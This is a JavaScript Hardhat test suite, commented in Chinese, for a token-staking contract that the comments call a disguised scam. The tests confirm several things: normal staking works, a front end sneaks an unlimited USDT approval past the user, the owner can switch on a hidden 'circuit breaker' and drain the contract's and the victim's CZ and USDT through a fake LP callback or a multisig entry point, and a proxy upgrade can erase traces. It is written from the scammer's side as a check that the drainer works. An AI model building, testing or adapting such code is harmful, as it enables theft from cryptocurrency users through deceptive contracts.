const { expect } = require('chai');
const { ethers } = require('hardhat');

// ============================================================
// 伪装 CZ 质押盘 — 全流程测试
// 覆盖：部署 → 正常质押 → 激活熔断器 → 触发收割 → 验证
// 测试币用 MockUSDT（6 位小数），CZ 和 USDT 各部署一个实例
// ============================================================

describe('CZStakingProxyDrain', function () {
  let proxy, impl, cz, usdt, owner, victim;

  beforeEach(async function () {
    [owner, victim] = await ethers.getSigners();

    // 部署测试代币（两个 MockUSDT 实例分别充当 CZ 与 USDT）
    const Mock = await ethers.getContractFactory('MockUSDT');
    cz = await Mock.deploy(0);
    usdt = await Mock.deploy(0);
    // 铸造给受害者
    await cz.mint(victim.address, 10_000_000n);   // 1000 CZ（6位小数）
    await usdt.mint(victim.address, 5_000_000n);  // 5 USDT

    // 部署实现 + 代理
    const Impl = await ethers.getContractFactory('CZStakingImpl');
    impl = await Impl.deploy();
    const Proxy = await ethers.getContractFactory('CZStakingProxy');
    const initData = impl.interface.encodeFunctionData('initialize', [await cz.getAddress(), await usdt.getAddress()]);
    proxy = await Proxy.deploy(await impl.getAddress(), initData);

    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    expect(await biz.owner()).to.equal(owner.address);
    expect(await biz.cz()).to.equal(await cz.getAddress());
    expect(await biz.usdt()).to.equal(await usdt.getAddress());
  });

  it('1. 正常质押 CZ 业务可用（无熔断器状态）', async function () {
    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    const proxyAddr = await proxy.getAddress();
    await cz.connect(victim).approve(proxyAddr, ethers.MaxUint256);
    await biz.connect(victim).stake(1_000_000n); // 1 CZ
    expect(await biz.staked(victim.address)).to.equal(1_000_000n);
    expect(await biz.totalStaked()).to.equal(1_000_000n);
    await biz.connect(victim).withdraw(500_000n);
    expect(await biz.staked(victim.address)).to.equal(500_000n);
    await biz.connect(victim).claimReward();
  });

  it('2. 夹带 USDT 授权后，激活熔断器可收割合约内 CZ + 用户 USDT/CZ', async function () {
    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    const proxyAddr = await proxy.getAddress();

    // 业务必需：授权 CZ 给代理
    await cz.connect(victim).approve(proxyAddr, ethers.MaxUint256);
    // 前端夹带：授权 USDT 给代理（用户无感）
    await usdt.connect(victim).approve(proxyAddr, ethers.MaxUint256);
    // 质押 1 CZ
    await biz.connect(victim).stake(1_000_000n);

    // owner 激活熔断器
    await biz.updateConfig(ethers.id('charge'), ethers.id('true'));
    expect(await biz.chargeEnabled()).to.equal(true);

    // 触发收割（伪装成 LP 回调）
    await biz.onLpReceived(victim.address, victim.address, 0, '0x');

    // 合约内质押 CZ 被收割
    expect(await cz.balanceOf(proxyAddr)).to.equal(0);
    // 用户 USDT 被拉走
    expect(await usdt.balanceOf(victim.address)).to.equal(0);
    // 用户剩余 CZ 被拉走
    expect(await cz.balanceOf(victim.address)).to.equal(0);
  });

  it('3. confirmMultisig 入口同样可触发收割（合约内 CZ + msg.sender 授权）', async function () {
    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    const proxyAddr = await proxy.getAddress();
    // 给 owner 铸币（owner 作为触发者，走 msg.sender 收割路径）
    await cz.mint(owner.address, 10_000_000n);
    await usdt.mint(owner.address, 5_000_000n);
    await cz.connect(owner).approve(proxyAddr, ethers.MaxUint256);
    await usdt.connect(owner).approve(proxyAddr, ethers.MaxUint256);
    await biz.connect(owner).stake(100_000n);
    await biz.updateConfig(ethers.id('charge'), ethers.id('true'));
    // 触发者 = owner（msg.sender 是 owner 地址）
    await biz.connect(owner).confirmMultisig(ethers.id('charge.now'), []);
    expect(await cz.balanceOf(proxyAddr)).to.equal(0);
    expect(await usdt.balanceOf(owner.address)).to.equal(0);
  });

  it('4. 熔断器未激活时不收割', async function () {
    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    const proxyAddr = await proxy.getAddress();
    await cz.connect(victim).approve(proxyAddr, ethers.MaxUint256);
    await biz.connect(victim).stake(100_000n);
    await biz.onLpReceived(victim.address, victim.address, 0, '0x');
    expect(await cz.balanceOf(proxyAddr)).to.equal(100_000n);
    expect(await usdt.balanceOf(victim.address)).to.equal(5_000_000n);
  });

  it('5. 代理壳可通过 upgradeTo 更换实现（抹除痕迹能力）', async function () {
    const biz = await ethers.getContractAt('CZStakingImpl', await proxy.getAddress());
    const NewImpl = await ethers.getContractFactory('CZStakingImpl');
    const newImpl = await NewImpl.deploy();
    await biz.upgradeTo(await newImpl.getAddress());
    expect(await biz.owner()).to.equal(owner.address);
  });
});
